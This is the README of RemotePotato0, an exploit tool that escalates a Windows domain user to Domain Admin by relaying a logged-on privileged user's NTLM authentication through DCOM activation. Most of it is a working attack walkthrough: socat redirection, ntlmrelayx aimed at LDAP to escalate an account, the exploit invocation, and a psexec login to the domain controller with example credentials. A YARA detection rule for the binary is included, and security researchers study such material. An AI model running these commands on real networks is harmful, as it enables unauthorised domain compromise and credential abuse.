# RemotePotato0
Just another "Won't Fix" Windows Privilege Escalation from User to Domain Admin.

RemotePotato0 is an exploit that allows you to escalate your privileges from a generic User to Domain Admin. 

Briefly:

It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine.
It is required you have a shell in session 0 (e.g. WinRm shell or SSH shell) and that a privileged user is logged on in the session 1 (e.g. a Domain Admin user).
Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource.

Full details at --> https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop

## Example

Attacker machine (192.168.83.130):

```
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
```
**Note: if you are on Windows Server <= 2016 you can avoid the network redirector (socat) because the oxid resolution can be performed locally.**

Victim machine (192.168.83.131):

```
.\RemotePotato0.exe -r 192.168.83.130 -p 9998
```
**Note2: Remember you can pick an arbitrary session activation with the -s flag, very powerful!**

Victim Domain Controller (192.168.83.135)

Enjoy shell (eg. psexec) as Enterprise Admin to the domain controller ;)

```
psexec.py 'SPLINTER/winrm_user_1:Password111!@192.168.83.135'
```

## Demo

### Cross session activation
<img src="demo_cross_session.gif">

### Shell in session 0
<img src="demo.gif">



## Detection

Yara rule to detect RemotePotato0 binary:

```
rule SentinelOne_RemotePotato0_privesc {
    meta:
        author = "SentinelOne"
        description = "Detects RemotePotato0 binary"
        reference = "https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop"
        
    strings:
        $import1 = "CoGetInstanceFromIStorage"
        $istorage_clsid = "{00000306-0000-0000-c000-000000000046}" nocase wide ascii
        $meow_header = { 4d 45 4f 57 }
        $clsid1 = "{11111111-2222-3333-4444-555555555555}" nocase wide ascii
        $clsid2 = "{5167B42F-C111-47A1-ACC4-8EABE61B0B54}" nocase wide ascii
        
    condition:        
        (uint16(0) == 0x5A4D) and $import1 and $istorage_clsid and $meow_header and 1 of ($clsid*)
}
```

## Authors

* [Antonio Cocomazzi](https://twitter.com/splinter_code)
* [Andrea Pierini](https://twitter.com/decoder_it)

## Credits

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [@tiraniddo](https://twitter.com/tiraniddo) - [Cross Session Activation](https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html)
